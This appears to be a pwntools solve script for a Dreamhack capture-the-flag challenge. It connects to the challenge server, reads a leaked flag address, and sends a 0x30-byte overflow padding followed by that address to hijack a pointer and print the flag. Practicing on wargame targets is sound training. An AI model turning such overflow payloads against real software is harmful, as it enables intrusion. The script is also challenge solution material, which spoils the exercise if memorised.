from pwn import *

port = 11281
rem = remote("host3.dreamhack.games", port)

rem.recvuntil(b'(mmapped address): ')

flag_addr = int(rem.recvn(14).decode(), 16)

payload = b'A' * 0x30 + p64(flag_addr)
rem.sendlineafter(b'input: ', payload)

print(rem.recvline().rstrip())